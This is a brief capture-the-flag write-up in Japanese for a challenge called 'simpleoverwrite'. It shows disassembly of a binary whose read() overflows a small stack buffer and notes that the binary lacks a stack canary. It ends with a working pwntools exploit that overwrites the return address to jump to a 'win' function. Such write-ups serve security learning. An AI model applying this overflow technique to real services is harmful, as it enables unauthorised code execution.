# writeup - simpleoverwrite

```
[0x004010a0]> pdf @main
            ; DATA XREF from entry0 @ 0x4010b8(r)
┌ 132: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_2h @ rbp-0x2
│           ; var void *buf @ rbp-0xa
│           0x004011cf      55             push rbp
│           0x004011d0      4889e5         mov rbp, rsp
│           0x004011d3      4883ec10       sub rsp, 0x10
│           0x004011d7      48c745f60000.  mov qword [buf], 0
│           0x004011df      66c745fe0000   mov word [var_2h], 0
│           0x004011e5      488d05240e00.  lea rax, str.input:         ; 0x402010 ; "input:"
│           0x004011ec      4889c7         mov rdi, rax                ; const char *format
│           0x004011ef      b800000000     mov eax, 0
│           0x004011f4      e847feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004011f9      488d45f6       lea rax, [buf]
│           0x004011fd      ba20000000     mov edx, 0x20               ; 32 ; size_t nbyte
│           0x00401202      4889c6         mov rsi, rax                ; void *buf
│           0x00401205      bf00000000     mov edi, 0                  ; int fildes
│           0x0040120a      e851feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0040120f      488d45f6       lea rax, [buf]
│           0x00401213      4889c6         mov rsi, rax
│           0x00401216      488d05fa0d00.  lea rax, str.Hello___s_n    ; 0x402017 ; "Hello, %s\n"
│           0x0040121d      4889c7         mov rdi, rax                ; const char *format
│           0x00401220      b800000000     mov eax, 0
│           0x00401225      e816feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040122a      488d45f6       lea rax, [buf]
│           0x0040122e      4883c012       add rax, 0x12               ; 18
│           0x00401232      488b00         mov rax, qword [rax]
│           0x00401235      4889c6         mov rsi, rax
│           0x00401238      488d05e30d00.  lea rax, str.return_to:_0x_lx_n ; str.return_to:_0x_lx_n
│                                                                      ; 0x402022 ; "return to: 0x%lx\n"
│           0x0040123f      4889c7         mov rdi, rax                ; const char *format
│           0x00401242      b800000000     mov eax, 0
│           0x00401247      e8f4fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040124c      b800000000     mov eax, 0
│           0x00401251      c9             leave
└           0x00401252      c3             ret
```

`buf`は`rbp-0xa`にある。

```
[0x004010a0]> iI
arch     x86
baddr    0x400000
binsz    14300
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 13.2.0-23ubuntu4) 13.2.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

canaryが無いのでシンプルにリターンアドレスを上書きする

```python
#!/usr/bin/env python3
from pwn import context,ELF,remote,p64
import os

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9001"))

context.log_level = "critical"
binfile = "./chall"
e = ELF(binfile)
context.binary = binfile

p = remote(HOST, PORT)

payload = b"a" * 18 + p64(e.sym["win"])
assert len(payload) <= 0x20

p.sendlineafter(b"input:", payload)
p.readline()
p.readline()
print(p.readline().decode(), end="")
```
